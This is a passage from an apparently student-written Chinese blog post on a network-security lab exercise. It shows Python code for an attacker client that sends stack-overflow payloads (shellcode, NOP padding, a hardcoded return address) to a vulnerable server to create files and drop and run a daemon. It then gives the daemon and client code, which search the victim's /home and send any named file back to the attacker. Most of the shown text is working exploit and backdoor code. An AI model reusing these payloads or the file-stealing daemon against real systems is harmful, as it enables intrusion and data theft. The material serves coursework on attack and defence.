shutdown(2) #收发通道关闭</span></span><br><span class="line">                clientsocket.close() <span class="comment">#关闭socket</span></span><br><span class="line">                attack_a3 = input(<span class="string">"此轮socket已关闭，是否继续攻击/通信（需要等目标恢复服务）？(y/n):"</span>)</span><br><span class="line">                <span class="keyword">if</span> attack_a3 == <span class="string">"y"</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    print(<span class="string">"END"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tans</span><span class="params">(clientsocket)</span>:</span></span><br><span class="line">    print(<span class="string">"connect success"</span>)</span><br><span class="line">    print(<span class="string">"attack_mode：【1】创建txt文件 【2】发送daemon程序 【3】执行daemon文件 【其他】正常沟通（输入quit退出））"</span>)</span><br><span class="line">    attack_mode = input(<span class="string">"请输入attack_mode:"</span>)</span><br><span class="line">    <span class="keyword">if</span> attack_mode == <span class="string">"1"</span>:  <span class="comment"># 【1】创建txt文件</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送"</span>)</span><br><span class="line">        <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"1"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"创建txt文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"2"</span>:  <span class="comment"># 【2】发送daemon程序</span></span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_daemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"2"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">        print(<span class="string">"发送daemon程序shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">elif</span> attack_mode == <span class="string">"3"</span>:  <span class="comment"># 【3】执行daemon文件</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送"</span>)</span><br><span class="line">        payload_new(shellcode_execdaemon) <span class="comment">#拼接shellcode</span></span><br><span class="line">        clientsocket.send(payload_new(<span class="string">"3"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">        print(<span class="string">"执行daemon文件shellcode发送结束"</span>)</span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 【其他】正常沟通</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">            input_data = input(<span class="string">"send:"</span>)</span><br><span class="line">            <span class="keyword">if</span> input_data==<span class="string">"quit"</span>:</span><br><span class="line">                input_data = <span class="string">b"\x90"</span> * (<span class="number">120</span>)</span><br><span class="line">                clientsocket.send(input_data)   <span class="comment"># 使服务器异常退出停止socket，可用于中止服务器</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            clientsocket.send(input_data.encode(<span class="string">"utf-8"</span>))  <span class="comment"># 这里要发生字节流形式，记住这个形式就可以了</span></span><br><span class="line">            data = clientsocket.recv(<span class="number">1024</span>)</span><br><span class="line">            print(<span class="string">"recv:"</span>, data)</span><br><span class="line"><span class="comment">#用于拼接字符串</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">payload_new</span><span class="params">(shellcode_mode)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> shellcode_mode==<span class="string">"2"</span>:</span><br><span class="line">        payload = shellcode_daemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_daemon))</span><br><span class="line">    <span class="keyword">elif</span> shellcode_mode==<span class="string">"3"</span>:</span><br><span class="line">        payload = shellcode_execdaemon + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_execdaemon))</span><br><span class="line">        print(<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = shellcode_createtxt + <span class="string">b"\x90"</span> * (<span class="number">108</span> - len(shellcode_createtxt))</span><br><span class="line">    payload = payload + <span class="string">b'\xcc\xde\xff\xbf\xdc\xde\xff\xbf'</span></span><br><span class="line">    payload = payload + <span class="string">b'\x00'</span></span><br><span class="line">    print(<span class="string">"拼接payload成功"</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">print(<span class="string">"正在扫描..., 请稍等..."</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动程序入口</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># 启动扫描程序</span></span><br><span class="line">    <span class="comment"># ports=input("输入想要扫描的端口")</span></span><br><span class="line">    <span class="comment"># port_list = port_list.append(ports.split(' '))</span></span><br><span class="line">    <span class="comment"># print(port_list)</span></span><br><span class="line">    <span class="comment"># search_routers()</span></span><br><span class="line">    comm_or_attack()</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-3-daemon服务端（受害方）程序-daemonl-py"><a href="#6-3-daemon服务端（受害方）程序-daemonl-py" class="headerlink" title="6.3 daemon服务端（受害方）程序 daemonl.py"></a>6.3 daemon服务端（受害方）程序 daemonl.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认的最大等待数量为5</span></span><br><span class="line">    <span class="comment"># 默认使用本机的ip地址和8080端口</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, backlog=<span class="number">5</span>, addr=<span class="params">(<span class="string">"192.168.30.133"</span>, <span class="number">8080</span>)</span>)</span>:</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        self.serverSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 绑定监听的ip地址和端口号</span></span><br><span class="line">        self.serverSocket.bind(addr)</span><br><span class="line">        <span class="comment"># 开始等待</span></span><br><span class="line">        self.serverSocket.listen(backlog)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 该函数需要并行处理</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_one_client</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 获取客户端对象和客户端地址</span></span><br><span class="line">        clientSocket, addr = self.serverSocket.accept()</span><br><span class="line">        <span class="comment"># 打印</span></span><br><span class="line">        print(<span class="string">"和客户端建立连接\n目标主机地址为：&#123;0&#125;"</span>.format(addr))</span><br><span class="line">        <span class="comment"># 接受客户端传递的公钥</span></span><br><span class="line">        <span class="comment"># 这里可以加一个哈希函数检验公钥的正确性！</span></span><br><span class="line">        <span class="comment"># 运用pickle进行反序列化</span></span><br><span class="line">        publicKeyPK, pubKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(publicKeyPK).hexdigest() != pubKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"公钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            publicKey = pickle.loads(publicKeyPK)</span><br><span class="line">            print(<span class="string">"已接受公钥"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 下面是用公钥加密对称密钥并传递的过程</span></span><br><span class="line">        <span class="comment"># 产生用于 AES 对称加密的密钥</span></span><br><span class="line">        sym_key = Fernet.generate_key()</span><br><span class="line">        <span class="comment"># 用pickle进行序列化用来进行网络传输</span></span><br><span class="line">        <span class="comment"># 对密钥进行hash保证其准确性</span></span><br><span class="line">        en_sym_key = rsa.encrypt(pickle.dumps(sym_key), publicKey)</span><br><span class="line">        en_sym_key_sha256 = hashlib.sha256(en_sym_key).hexdigest()</span><br><span class="line">        print(<span class="string">"正在加密传送AES对称密钥"</span>) <span class="comment">#发送AES密钥以及AES密钥的摘要</span></span><br><span class="line">        clientSocket.send(pickle.dumps((en_sym_key,en_sym_key_sha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 这里可以添加密钥交换成功的函数</span></span><br><span class="line">        print(<span class="string">"密钥交换结束"</span>)</span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(sym_key)</span><br><span class="line">        <span class="comment"># 下面使用对称密钥进行加密对话的过程</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="comment"># 接收到的加密消息</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()  #====接收解密</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接受到客户端传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line">            sendData = get_reply(recvData)<span class="comment">#调用回复函数来判断</span></span><br><span class="line">            <span class="comment"># 对消息进行加密</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line"><span class="comment"># route=["/home/lfl/桌面/Socket_Example-master/lesson03_trans_file/lfl.txt"] #路径列表，我们用第一个</span></span><br><span class="line">routes=[]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_reply</span><span class="params">(recvData)</span>:</span></span><br><span class="line">    recvData=json.loads(recvData)</span><br><span class="line">    <span class="comment"># print(recvData["A"])</span></span><br><span class="line">    <span class="keyword">if</span> recvData[<span class="string">"Method"</span>]==<span class="string">"get_file"</span>:</span><br><span class="line">        print(recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        search(os.path.abspath(<span class="string">'/home'</span>), recvData[<span class="string">"file_name"</span>])</span><br><span class="line">        <span class="comment"># print(route[0])</span></span><br><span class="line">        print(routes)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\""</span>+open(routes[<span class="number">0</span>]).read().replace(<span class="string">'\n'</span>, <span class="string">''</span>).replace(<span class="string">'\r'</span>, <span class="string">''</span>)+<span class="string">"\"&#125;"</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment">#不是get_file</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"&#123;\"content\":\"hello\"&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索文件</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(curpath, s)</span>:</span></span><br><span class="line">    L = os.listdir(curpath)  <span class="comment">#列出当前目录下所有文件</span></span><br><span class="line">    <span class="keyword">for</span> subpath <span class="keyword">in</span> L:  <span class="comment">#遍历当前目录所有文件</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(os.path.join(curpath, subpath)):  <span class="comment">#若文件仍为目录，递归查找子目录</span></span><br><span class="line">            newpath = os.path.join(curpath, subpath)</span><br><span class="line">            search(newpath, s)</span><br><span class="line">        <span class="keyword">elif</span> os.path.isfile(os.path.join(curpath, subpath)):  <span class="comment">#若为文件，判断是否包含搜索字串</span></span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> subpath:</span><br><span class="line">                routes.append(os.path.join(curpath, subpath))</span><br><span class="line">                <span class="comment">#print(routes)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"dameon开始运行！"</span>)</span><br><span class="line">    server = Server()</span><br><span class="line">    server.link_one_client()</span><br></pre></td></tr></table></figure>
+
+<h2 id="6-4-daemon客户端（攻击方）程序-client-py"><a href="#6-4-daemon客户端（攻击方）程序-client-py" class="headerlink" title="6.4 daemon客户端（攻击方）程序 client.py"></a>6.4 daemon客户端（攻击方）程序 client.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment">#公钥和公钥摘要不一致，密钥被篡改！</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthenticationError</span><span class="params">(Exception)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, Errorinfo)</span>:</span></span><br><span class="line">        super().__init__()</span><br><span class="line">        self.errorinfo = Errorinfo</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.errorinfo</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Client</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 产生rsa非对称密钥</span></span><br><span class="line">        self.rsaKey = rsa.newkeys(<span class="number">2048</span>)</span><br><span class="line">        <span class="comment"># 产生rsa公钥和私钥</span></span><br><span class="line">        self.publicKey = self.rsaKey[<span class="number">0</span>]</span><br><span class="line">        self.privateKey = self.rsaKey[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">link_server</span><span class="params">(self, ip,port )</span>:</span></span><br><span class="line">        addr = (ip, port)</span><br><span class="line">        <span class="comment"># 创建socket通信对象</span></span><br><span class="line">        <span class="comment"># 默认使用AF_INET协议族，即ipv4地址和端口号的组合以及tcp协议</span></span><br><span class="line">        clientSocket = socket.socket()</span><br><span class="line">        <span class="comment"># 默认连接服务器地址为本机ip和8080端口</span></span><br><span class="line">        clientSocket.connect(addr)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 向服务器传递公钥，和该公钥字符串化后的sha256值</span></span><br><span class="line">        <span class="comment"># 发送的sha256用于校验公钥是否正确</span></span><br><span class="line">        print(<span class="string">"正在向服务器传送 RSA 公钥"</span>)</span><br><span class="line">        sendKey = pickle.dumps(self.publicKey)</span><br><span class="line">        sendKeySha256 = hashlib.sha256(sendKey).hexdigest()</span><br><span class="line">        clientSocket.send(pickle.dumps((sendKey, sendKeySha256)))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 接受服务器传递的密钥并进行解密</span></span><br><span class="line">        symKey, symKeySha256 = pickle.loads(clientSocket.recv(<span class="number">1024</span>))</span><br><span class="line">        <span class="keyword">if</span> hashlib.sha256(symKey).hexdigest() != symKeySha256:</span><br><span class="line">            <span class="keyword">raise</span> AuthenticationError(<span class="string">"AES密钥被篡改！"</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.symKey = pickle.loads(rsa.decrypt(symKey, self.privateKey))</span><br><span class="line">            print(<span class="string">"AES密钥交换完成"</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 从AES的密钥初始化加密对象</span></span><br><span class="line">        AES = Fernet(self.symKey)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            file_name = input(<span class="string">"输入你想获得的文件："</span>)</span><br><span class="line">            sendData =<span class="string">"&#123;\"Method\":\"get_file\",\"file_name\": \""</span>+file_name+<span class="string">"\"&#125;"</span></span><br><span class="line">            print(sendData)</span><br><span class="line">            <span class="comment"># ============加密发送=================</span></span><br><span class="line">            <span class="comment"># sendData = AES.encrypt(sendData.encode())</span></span><br><span class="line">            <span class="comment"># clientSocket.send(sendData)</span></span><br><span class="line">            <span class="comment"># ===============不加密=================</span></span><br><span class="line">            clientSocket.send(sendData.encode())</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 接收数据</span></span><br><span class="line">            recvData = clientSocket.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="comment"># ============接收解密=================</span></span><br><span class="line">            <span class="comment"># recvData = AES.decrypt(recvData).decode()</span></span><br><span class="line">            <span class="comment"># ================不解密=================</span></span><br><span class="line">            recvData = recvData.decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            print(<span class="string">"接收到加密的文件数据,保存文件"</span>)</span><br><span class="line">            print(recvData)</span><br><span class="line">            recvData = json.loads(recvData) <span class="comment">#加载文件内容为json</span></span><br><span class="line">            file = open(file_name, <span class="string">'a'</span>)  <span class="comment"># 若文件不存在，系统自动创建'a'表示可连续写入到文件，保留原内容，在原内容之后写入，可修改该模式（'w+','w','wb'等）</span></span><br><span class="line">            file.write(recvData[<span class="string">"content"</span>])  <span class="comment"># 将字符串写入文件中</span></span><br><span class="line">            file.close()</span><br><span class="line">            print(<span class="string">"接受到服务器传来的消息：&#123;0&#125;"</span>.format(recvData))</span><br><span class="line"><span class="comment">#main函数</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"欢迎使用客户端程序！"</span>)</span><br><span class="line">    client = Client()</span><br><span class="line">    client.link_server(<span class="string">"192.168.30.133"</span>,<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    ColaLinN
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://shenqiy.cn/2020-06-22-NS-The-Final-Exam/" title="网络安全综合实验设计">https://shenqiy.cn/2020-06-22-NS-The-Final-Exam/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%9E%E9%AA%8C/" rel="tag"><i class="fa fa-tag"></i> 实验</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020-06-13-ida-usage/" rel="next" title="IDA pro的使用总结">
+                <i class="fa fa-chevron-left"></i> IDA pro的使用总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020-06-29-Viewing-record/" rel="prev" title="观影记录">
+                观影记录 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div id="gitalk-container">
+	</div>	
+
+  
+
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.jpg"
+                alt="ColaLinN" />
+            
+              <p class="site-author-name" itemprop="name">ColaLinN</p>
+              <p class="site-description motion-element" itemprop="description">集中一点 登峰造极</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">47</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/">
+                  <span class="site-state-item-count">11</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/">
+                  <span class="site-state-item-count">28</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ColaLinN" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:shenqiaaa@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+		  
+				  
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#总体设计"><span class="nav-text">总体设计</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务一-字符串前后翻转服务端程序"><span class="nav-text">任务一 字符串前后翻转服务端程序</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-漏洞原理"><span class="nav-text">1.1 漏洞原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-收发数据"><span class="nav-text">1.2 收发数据</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务二、恶意客户端程序"><span class="nav-text">任务二、恶意客户端程序</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-扫描找到有该漏洞的服务端机器"><span class="nav-text">2.1 扫描找到有该漏洞的服务端机器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-正常通信——字符串前后翻转"><span class="nav-text">2.2 正常通信——字符串前后翻转</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-exploit功能"><span class="nav-text">2.3 exploit功能</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务三、daemon程序"><span class="nav-text">任务三、daemon程序</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-搜索服务器上的任意指定文件"><span class="nav-text">3.1 搜索服务器上的任意指定文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-利用网络传送指定文件给客户端"><span class="nav-text">3.2 利用网络传送指定文件给客户端</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#任务四、密钥管理机制和传输加密方案"><span class="nav-text">任务四、密钥管理机制和传输加密方案</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-密钥管理机制和传输加密方案"><span class="nav-text">4.1 